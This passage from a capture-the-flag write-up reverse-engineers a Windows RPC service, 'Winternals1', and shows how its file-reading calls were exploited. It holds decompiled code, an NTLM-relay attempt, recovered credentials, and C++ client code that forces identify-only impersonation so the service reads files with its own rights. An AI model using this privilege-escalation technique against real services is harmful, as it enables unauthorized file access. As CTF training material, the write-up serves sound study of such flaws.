  DWORD v9; // eax
  DWORD Members; // eax
  wchar_t *v11; // rax
  const wchar_t *v12; // rdi
  LPBYTE v13; // r14
  int v14; // ebx
  DWORD cchReferencedDomainName; // [rsp+40h] [rbp-58h] BYREF
  DWORD cchName; // [rsp+44h] [rbp-54h] BYREF
  PSID Sid; // [rsp+48h] [rbp-50h] BYREF
  LPBYTE bufptr; // [rsp+50h] [rbp-48h] BYREF
  DWORD entriesread; // [rsp+58h] [rbp-40h] BYREF
  enum _SID_NAME_USE peUse; // [rsp+5Ch] [rbp-3Ch] BYREF
  DWORD totalentries; // [rsp+60h] [rbp-38h] BYREF
  ULONG_PTR resumehandle; // [rsp+68h] [rbp-30h] BYREF

  v2 = 0;
  ReferencedDomainName = 0i64;
  Sid = 0i64;
  cchName = 256;
  cchReferencedDomainName = 256;
  bufptr = 0i64;
  resumehandle = 0i64;
  if ( ConvertStringSidToSidW(a1, &Sid) )
  {
    v7 = (WCHAR *)LocalAlloc(0x40u, 2i64 * cchName);
    if ( v7 )
    {
      ReferencedDomainName = (WCHAR *)LocalAlloc(0x40u, 2i64 * cchReferencedDomainName);
      if ( ReferencedDomainName )
      {
        if ( LookupAccountSidW(0i64, Sid, v7, &cchName, ReferencedDomainName, &cchReferencedDomainName, &peUse) )
        {
          Members = NetLocalGroupGetMembers(
                      0i64,
                      v7,
                      1u,
                      &bufptr,
                      0xFFFFFFFF,
                      &entriesread,
                      &totalentries,
                      &resumehandle);
          if ( Members )
          {
            sub_140002340(L"NetLocalGroupGetMembers() err: %d - 0x%08x\r\n", Members, Members);
          }
          else
          {
            v11 = wcsstr(a2, L"\\");
            if ( v11 )
              v12 = v11 + 1;
            else
              v12 = a2;
            v13 = bufptr;
            v14 = 0;
            if ( entriesread )
            {
              while ( wcsicmp(v12, *(const wchar_t **)&v13[24 * v14 + 16]) )
              {
                if ( ++v14 >= entriesread )
                  goto LABEL_17;
              }
              v2 = 1;
            }
          }
        }
        else
        {
          LastError = GetLastError();
          v9 = GetLastError();
          sub_140002340(L"LookupAccountSidW() err: %d - 0x%08x\r\n", v9, LastError);
        }
      }
    }
  }
  else
  {
    v5 = GetLastError();
    v6 = GetLastError();
    sub_140002340(L"ConvertStringSidToSidW() err: %d - 0x%08x\r\n", v6, v5);
  }
LABEL_17:
  if ( Sid )
    LocalFree(Sid);
  if ( ReferencedDomainName )
    LocalFree(ReferencedDomainName);
  if ( bufptr )
    NetApiBufferFree(bufptr);
  return v2;
}
```

Oh! The documentation for `RpcBindingInqAuthClientW` says that the second parameter is used to specify an address to recevie a Security Provider specific data pointer with information about the client's identity.

The code above seems to expect the client's SID (Security identifier) to be returned, and then checks whether the user belongs to the group with the SID `S-1-5-32-545` which is the built-in group called `Users`.

This means we need to be either authenticated as a registered user or find a bug in this code. I have started by looking at the other security providers, however according to the documentation the client can only use security providers that have been registered by the server. In the function `RegisterService` that we have looked at before, the only provider that has been registered is the one with ID 10 which is `RPC_C_AUTHN_WINNT`. This means that this is unlikely to be bypassable.

However, if we look at `InsoRpcFileExists` again, we can see that it actually logs in as some user before querying whether the file exists:

```cpp
__int64 __fastcall InsoRpcFileExists(__int64 a1, WCHAR *a2, bool *a3)
{
  unsigned int v5; // edi
  int v6; // ebp
  unsigned int v7; // eax
  unsigned int v8; // eax
  DWORD v9; // ebx
  DWORD v10; // eax
  DWORD LastError; // ebx
  DWORD v12; // eax
  HKEY hKey; // [rsp+30h] [rbp-248h] BYREF
  HANDLE phToken; // [rsp+38h] [rbp-240h] BYREF
  DWORD cbData; // [rsp+40h] [rbp-238h] BYREF
  DWORD Type[3]; // [rsp+44h] [rbp-234h] BYREF
  WCHAR v18[128]; // [rsp+50h] [rbp-228h] BYREF
  WCHAR Data[128]; // [rsp+150h] [rbp-128h] BYREF

  sub_140002340(L"REQUEST > InsoRpcFileExists\r\n");
  if ( a2 && a3 && (unsigned int)sub_140002B10(a2) )
  {
    v5 = 0;
    hKey = 0i64;
    phToken = 0i64;
    v6 = 0;
    v7 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Winternals1\\RestrictedAccount", 0, 1u, &hKey);
    if ( v7 )
    {
      sub_140002340(L"RegOpenKeyExW() err: %d - 0x%08x\r\n", v7, v7);
    }
    else
    {
      Type[0] = 1;
      cbData = 256;
      v8 = RegQueryValueExW(hKey, L"Username", 0i64, Type, (LPBYTE)Data, &cbData);
      if ( v8 || (cbData = 256, (v8 = RegQueryValueExW(hKey, L"Password", 0i64, Type, (LPBYTE)v18, &cbData)) != 0) )
      {
        sub_140002340(L"RegQueryValueExW() err: %d - 0x%08x\r\n", v8, v8);
      }
      else if ( LogonUserW(Data, L".", v18, 2u, 0, &phToken) )
      {
        if ( ImpersonateLoggedOnUser(phToken) )
        {
          v6 = 1;
        }
        else
        {
          LastError = GetLastError();
          v12 = GetLastError();
          sub_140002340(L"ImpersonateLoggedOnUser() err: %d - 0x%08x\r\n", v12, LastError);
        }
      }
      else
      {
        v9 = GetLastError();
        v10 = GetLastError();
        sub_140002340(L"LogonUserW() err: %d - 0x%08x\r\n", v10, v9);
      }
    }
    if ( hKey )
      RegCloseKey(hKey);
    if ( phToken )
      CloseHandle(phToken);
    if ( v6 )
    {
      *a3 = GetFileAttributesW(a2) != -1;
      RevertToSelf();
    }
    else
    {
      v5 = 0x8000FFFF;
    }
  }
  else
  {
    v5 = 0x80070057;
  }
  sub_140002340(L"RESPONSE > InsoRpcFileExists: 0x%08x\r\n", v5);
  return v5;
}
```

I initailly was unsure what to do with this as I am not too familiar with Windows exploitation. However after looking at the binary for a while I noticed the registry set in the `RegisterService` function. After Googling for a while, setting `AuthForwardServerList` to `*` allows credential forwarding for WebDAV services for non-intranet services. Which after some more research, gives us two possibilities:
- password bruteforce
- NTLM relay attack

I have written a script to try to perform NTLM relay, however it did not work and such I will not go into much detail. I captured a WireShark trace for a `InsoRpcReadFile` call and guessed the header fields (WireShark could partially decode it). Then I set up a fake WebDAV server that I then had the remote connect to calling the `InsoRpcFileExists` RPC call unauthenticated with `\\<my IP>@<port>\DavWWWRoot\` as the path. I am unsure why it did not work (it failed with error 5 - Access Denied), but it is possible that Windows rejects NTLM credentials for local users.

This gave us the password bruteforce possibility. A different member of the team has done this (also using the samba protocol instead of WebDAV - the WebDav setup was not strictly neccessary!) and posted the password. TODO: Describe how this was done

Now that we have the user password we can call the different RPC calls by using `RpcBindingSetAuthInfo`:

```cpp
    auto domain = L".";
    auto user = L"Limited";
    auto pass = L"Insomnia1";

    SEC_WINNT_AUTH_IDENTITY authInfo;
    authInfo.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
    authInfo.Domain = (RPC_WSTR)domain;
    authInfo.DomainLength = wcslen(domain);
    authInfo.User = (RPC_WSTR)user;
    authInfo.UserLength = wcslen(user);
    authInfo.Password = (RPC_WSTR)pass;
    authInfo.PasswordLength = wcslen(pass);

    status = RpcBindingSetAuthInfo(hCtf, (RPC_WSTR)L"PRINCNAME", RPC_C_AUTHN_LEVEL_CALL, RPC_C_AUTHN_WINNT, &authInfo, 0);

    if (status) exit(status);
```

Now we can explore the file system using file listing. I was however unable to immediately find where the directory with the service file was. However after looking at the other methods, the `InsoRpcQueryFileFullPath` RPC call actually returns us the path to the `Service.exe` if an empty file path is passed! This let us know that the service is installed in `C:\Program Files\Winternals1\Service.exe`. But obviously, our user is unable to read the flag.txt file, which we can attempt to read by (ab)using the fact that NTFS is case insensitive and reading `C:\Program Files\Winternals1\FLAG.txt` instead.

## The second vulnerability

We can notice that in the `InsoRpcReadFile` (and `InsoRpcReadFilePriviledged`) function, the priviledge escalation looks dodgy:

```cpp
  v9 = 0;
  if ( RpcImpersonateClient(BindingHandle) )
  {
    LastError = GetLastError();
    v11 = GetLastError();
    sub_140002340(L"RpcImpersonateClient() err: %d - 0x%08x\r\n", v11, LastError);
  }
  else
  {
    v9 = 1;
  }
  ...
  // read the file
  ...
  if ( v9 )
    RpcRevertToSelf();
```

You can see the full code above. But the relevant part, is that `v9`, which is the flag whether the impersonation succeeded is only used to later know whether to exit from the impersonation. If the impersonation fails, the program runs with the same priviledges as the service (which presumably will be able to read the flag file). So the idea is to make `RpcImpersonateClient` fail. But how?

I was unsure, so I tried finding an answer in Google. I found this website: https://csandker.io/2021/02/21/Offensive-Windows-IPC-2-RPC.html, which mentioned the existence of **Security Quality-of-Service** that can be set by the client, and can be used to restrict the security credentials so that they can only be used for identification. This sounds exactly like what we need!

I simply used GitHub code search to find an usage `RpcBindingSetAuthInfoEx` and came with the following code:

```cpp

    auto domain = L".";
    auto user = L"Limited";
    auto pass = L"Insomnia1";

    SEC_WINNT_AUTH_IDENTITY authInfo;
    authInfo.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
    authInfo.Domain = (RPC_WSTR)domain;
    authInfo.DomainLength = wcslen(domain);
    authInfo.User = (RPC_WSTR)user;
    authInfo.UserLength = wcslen(user);
    authInfo.Password = (RPC_WSTR)pass;
    authInfo.PasswordLength = wcslen(pass);

    RPC_SECURITY_QOS_V5 qos{};
    qos.Version = RPC_C_SECURITY_QOS_VERSION_5;
    qos.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
    qos.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;
    qos.ImpersonationType = RPC_C_IMP_LEVEL_IDENTIFY;

    status = RpcBindingSetAuthInfoEx(hCtf, (RPC_WSTR)L"PRINCNAME", RPC_C_AUTHN_LEVEL_CALL, RPC_C_AUTHN_WINNT, &authInfo, 0, (RPC_SECURITY_QOS*)&qos);
    
    if (status) exit(status);
    
```

For some reason calling `InsoRpcReadFile` failed with the error `0x80070542` (Impersonation Level is Invalid). I was unsure why, but I tried using `InsoRpcReadFilePrivileged` instead and it worked and I got the flag!